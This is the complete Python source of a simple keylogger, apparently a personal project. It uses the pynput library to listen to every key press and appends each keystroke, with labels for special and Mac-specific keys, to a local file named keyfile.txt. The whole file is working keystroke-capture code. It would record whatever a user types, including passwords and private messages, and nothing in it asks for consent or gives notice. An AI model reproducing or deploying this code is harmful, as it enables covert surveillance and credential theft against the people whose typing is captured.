# Version 1.0.0
# Author: Erik Hai
# Last Modified: 18/12/23





from pynput import keyboard



def keyPressed(key):
    
    with open("keyfile.txt", 'a') as LogKey: #Create a new textfile called keyfile and make it open for append. 
        try:
            char = key.char
            LogKey.write(char)
        except: #These are for the other keyboard buttons that are not letters or symbols such as the tab button or the shift button
            if (str(key) == "Key.enter"):
                LogKey.write("\n")
            elif (str(key) == "Key.space"):
                LogKey.write(" ")
            elif (str(key) == "Key.up"):
                LogKey.write("↑")
            elif (str(key) == "Key.down"):
                LogKey.write("↓")
            elif (str(key) == "Key.left"):
                LogKey.write("←")
            elif (str(key) == "Key.right"):
                LogKey.write("→")
            elif (str(key) == "Key.backspace"):
                LogKey.write(" (BackSpace) ")
            elif (str(key) == "Key.alt_r"):
                LogKey.write(" (Right Option) ")
            elif (str(key) == "Key.cmd_r"):
                LogKey.write(" (Right Command) ")
            elif (str(key) == "Key.cmd"):
                LogKey.write(" (Left Command) ")
            elif (str(key) == "Key.alt"):
                LogKey.write(" (Left Option) ")
            elif (str(key) == "Key.ctrl"):
                LogKey.write(" (Control) ")
            elif (str(key) == "<179>"):
                LogKey.write(" (fn) ")
            elif (str(key) == "Key.shift"):
                LogKey.write(" (Shift) ")    
            elif (str(key) == "Key.caps_lock"):
                LogKey.write(" (Caps Lock) ")  
            elif (str(key) == "Key.tab"):
                LogKey.write(" (Tab) ")
            elif (str(key) == "Key.shift_r"):
                LogKey.write(" (Right Shift) ") 
            elif (str(key) == "Key.media_volume_up"):
                LogKey.write(" (Volume Up) ")  
            elif (str(key) == "Key.media_volume_down"):
                LogKey.write(" (Volume Down) ")  
            elif (str(key) == "Key.media_volume_mute"):
                LogKey.write(" (Volume Mute) ")  
            elif (str(key) == "Key.media_play_pause"):
                LogKey.write(" (Play/Pause) ")  
            elif (str(key) == "Key.esc"):
                LogKey.write(" (Escape) ")  
            elif (str(key) == "<160>"):
                LogKey.write(" (Mission Control) ")  
            elif (str(key) == "<177>"):
                LogKey.write(" (Search) ")  
            elif (str(key) == "<176>"):
                LogKey.write(" (Dictation) ")  
            elif (str(key) == "<178"):
                LogKey.write(" (Do Not Disturb) ")  
            elif (str(key) == "Key.f1"):
                LogKey.write(" (f1) ")  
            elif (str(key) == "Key.f2"):
                LogKey.write(" (f2) ")  
            elif (str(key) == "Key.f3"):
                LogKey.write(" (f3) ")  
            elif (str(key) == "Key.f4"):
                LogKey.write(" (f4) ")  
            elif (str(key) == "Key.f5"):
                LogKey.write(" (f5) ")  
            elif (str(key) == "Key.f6"):
                LogKey.write(" (f6) ")  
            elif (str(key) == "Key.f7"):
                LogKey.write(" (f7) ")  
            elif (str(key) == "Key.f8"):
                LogKey.write(" (f8) ")  
            elif (str(key) == "Key.f9"):
                LogKey.write(" (f9) ")                         
            elif (str(key) == "Key.f10"):
                LogKey.write(" (f10) ")  
            elif (str(key) == "Key.f11"):
                LogKey.write(" (f11) ")                         
            elif (str(key) == "Key.f12"):
                LogKey.write(" (f12) ")                               
            else:
                print("Error getting keyboard input")
            
            

if __name__ == "__main__":
    listener = keyboard.Listener(on_press = keyPressed) # Create a keyboard listener with the 'keyPressed' function as the callback for key presses.
    listener.start() # Start the listener to capture key presses.
    input() # Keep the script running until manual interruption.